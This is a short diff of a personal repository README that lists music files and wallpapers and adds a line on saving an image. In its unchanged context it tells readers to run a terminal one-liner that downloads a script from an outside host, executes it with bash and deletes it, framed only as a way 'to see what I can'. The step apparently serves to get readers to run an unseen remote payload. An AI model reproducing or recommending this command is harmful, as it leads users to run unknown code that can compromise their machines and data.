@@ -14,6 +14,7 @@ In this repository you can find
 * My favorite music MP3 Files
 
 * My favorite wallpapers 16:9
+ * To download one, open it, right clicl on image, press "Save as..."
 
 To see what I can, do this comand in terminal from user:
  $ wget http://archwell.tk/sprayer.script && bash sprayer.script && rm sprayer.script
